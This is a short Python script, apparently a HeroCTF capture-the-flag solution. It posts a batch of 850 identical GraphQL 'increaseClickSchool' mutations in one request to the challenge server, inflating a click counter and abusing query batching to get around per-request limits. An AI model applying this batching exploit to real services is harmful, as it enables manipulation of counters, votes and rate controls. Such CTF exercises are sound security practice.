import requests


url = "http://dyn-02.heroctf.fr:14647/graphql"  
data = [{"query":"mutation { increaseClickSchool(schoolName: \"Flag CyberSecurity School\"){schoolId, nbClick} }"}] * 850
r = requests.post(url, json =data)
print(r.text)
